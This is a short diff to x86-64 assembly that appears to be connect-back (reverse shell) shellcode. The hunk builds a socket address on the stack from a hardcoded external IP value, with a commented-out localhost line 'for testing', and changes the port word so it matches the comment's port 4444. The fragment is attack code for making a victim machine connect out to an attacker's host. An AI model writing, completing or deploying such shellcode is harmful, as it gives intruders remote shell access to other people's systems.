@@ -163,7 +163,7 @@ push rax
         mov rax,  0xbf6d24b0
         ;mov rax, 0x0100007F                   ; UNCOMENT FOR TESTING! ; Push IP 127.0.0.1
         push rax                                ; Push our saved IP!
-        push word 0x0a1a                        ; Port (4444)
+        push word 0x5c11                        ; Port (4444)
         push word 2                             ; Address family -
 
 
